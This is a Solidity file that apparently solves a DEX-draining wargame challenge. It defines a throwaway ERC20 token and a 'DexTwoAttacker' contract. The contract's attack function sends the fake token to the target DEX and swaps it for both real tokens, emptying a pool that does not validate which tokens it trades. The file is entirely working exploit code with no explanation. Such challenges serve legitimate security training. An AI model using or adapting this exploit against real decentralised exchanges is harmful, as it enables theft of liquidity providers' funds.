// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract DumCoin is ERC20 {
    constructor() public ERC20("DUMMY", "DUM") {
        _mint(msg.sender, 1000);
    }
}

interface IDexTwo {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function swap(
        address from,
        address to,
        uint256 amount
    ) external;

    function approve(address spender, uint256 amount) external;

    function balanceOf(address token, address account)
        external
        view
        returns (uint256);

    function getSwapAmount(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);
}

contract DexTwoAttacker {
    using SafeMath for uint256;
    IDexTwo public target;
    DumCoin public token3;

    constructor(address _targetAddress) public {
        target = IDexTwo(_targetAddress);
    }

    function launchCoin() public {
        token3 = new DumCoin();
    }

    function attack(uint256 token1bal, uint256 token2bal) public {
        launchCoin();
        // Approve
        target.approve(address(target), type(uint256).max);
        token3.approve(address(target), type(uint256).max);

        // Send the dex fake tokens and swap
        token3.transfer(address(target), token1bal);
        target.swap(address(token3), target.token1(), token1bal);

        // check required amount and swap
        uint256 t3req = target.getSwapAmount(
            target.token2(),
            address(token3),
            token2bal
        );
        target.swap(address(token3), target.token2(), t3req);
    }

    function token3Bal(address _accountAddress) public view returns (uint256) {
        return token3.balanceOf(_accountAddress);
    }
}
